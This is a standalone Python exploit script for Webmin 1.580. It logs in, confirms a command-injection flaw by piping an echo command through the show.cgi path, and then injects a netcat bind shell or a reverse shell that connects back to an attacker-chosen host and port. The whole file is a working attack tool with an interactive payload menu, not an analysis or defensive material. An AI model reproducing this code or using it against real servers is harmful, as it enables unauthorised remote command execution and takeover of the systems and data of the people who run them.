import os
import sys
import time
import platform
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()

def webmin_1580_exploit(url, username, password, lhost, lport, payload):
	"""Webmin 1.580 Exploit"""
	# Normalize Url ########
	if url.endswith('/'):
		url = url
	else:
		url = url + '/'
	########################

	p = 0

	# Select Payload #######
	if payload == 'nc_bind':
		p = 1
		pload = f'/bin/nc -lp {lport} -e /bin/bash'
	elif payload == 'nc_reverse':
		pload = f'/bin/nc {lhost} {lport} -e /bin/bash'
	else:
		print('\033[1;31m[-]\033[m Payload not found.')
		return False
	########################

	uri_login = 'session_login.cgi'
	url_login = url + uri_login
	data_login = {
		'page': '/',
		'user': username,
		'pass': password
	}

	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Referer': url_login,
	}
	print(f'\033[1;34m[*]\033[m Trying Login \033[1;37m{username} \033[1;33m/\033[1;37m {password}\033[m')
	time.sleep(1)
	res = session.post(url_login, data=data_login, headers=headers, cookies={'testing': '1'})
	if 'username and password to login to the Webmin' not in res.text:
		url_check_vuln = url + '/file/show.cgi/bin/AenbU|echo 7c434abf965aef231a229d28122e0af2|'
		res2 = session.get(url_check_vuln)
		if '7c434abf965aef231a229d28122e0af2' in res2.text:
			print('\033[1;32m[+]\033[m Login Successfully.')
			time.sleep(0.3)
			print('\033[1;32m[+]\033[m Target is vulnerable.')
			time.sleep(0.3)
			print('\033[1;34m[*]\033[m Sended payload...')
			if p == 1:
				print(f'\033[1;35m[!]\033[m Try Connect in \033[1;31mTarget\033[m in Port \033[1;33m{lport}\033[m')
			url_exploit = url + f'/file/show.cgi/bin/BdsIe|{pload}|'
			session.get(url_exploit)
		else:
			print('\033[1;31m[-]\033[m Target is not exploitable.\033[m')
			time.sleep(0.3)
			return False
	else:
		print('\033[1;31m[-]\033[m Login Failed...\033[m')
		time.sleep(0.7)
		return False

if __name__ == '__main__':
	if platform.system == 'Windows':
		os.system('cls')
	else:
		os.system('clear')

	print('''\033[1;36m
 _________________________
< \033[1;33mWebmin 1.580 - Exploit\033[1;36m >
 -------------------------\033[1;31m
        \   ^__^
         \  (oo)\\_______
            (__)\\       )\\/\\
                ||----w |		\033[1;31mCoded by : N3utr0n
                ||     ||\033[m

   \033[1;32mDate : 06/04/2022
    				\033[1;37mFacebook : https://m.facebook.com/miraldino.paulo.7\033[m
	''')
	try:
		url = input('(\033[1;31mWebmin 1.580\033[m)-(\033[1;31mURL\033[m) >\033[1;37m ')
		username = input('\033[m(\033[1;31mWebmin 1.580\033[m)-(\033[1;31mUsername\033[m) >\033[1;37m ')
		password = input('\033[m(\033[1;31mWebmin 1.580\033[m)-(\033[1;31mPassword\033[m) >\033[1;37m ')
		
		print('\n\033[1;35m[!]\033[m Payloads...\n')
		print('\033[1;33m[1].\033[1;36m Netcat Bind')
		print('\033[1;33m[2].\033[1;36m Netcat Reverse\n')
		payload = int(input('\033[m(\033[1;31mWebmin 1.580\033[m)-(\033[1;31mPayload\033[m) >\033[1;37m '))
		if payload == 1:
			payload = 'nc_bind'
			lhost = ''
			lport = int(input('\033[m(\033[1;31mWebmin 1.580\033[m)-(\033[1;31mLPORT\033[m) >\033[1;37m '))
			print()
			webmin_1580_exploit(url, username, password, lhost, lport, payload)
		elif payload == 2:
			payload = 'nc_reverse'
			lhost = input('\033[m(\033[1;31mWebmin 1.580\033[m)-(\033[1;31mLHOST\033[m) >\033[1;37m ')
			lport = int(input('\033[m(\033[1;31mWebmin 1.580\033[m)-(\033[1;31mLPORT\033[m) >\033[1;37m '))
			print()
			webmin_1580_exploit(url, username, password, lhost, lport, payload)
	except KeyboardInterrupt:
		print('\n\033[1;31m[-]\033[m Control C - Detected.')
		sys.exit(1)
	except Exception as e:
		print(f'\033[1;31m[-]\033[m Error {str(e)}')
		sys.exit(1)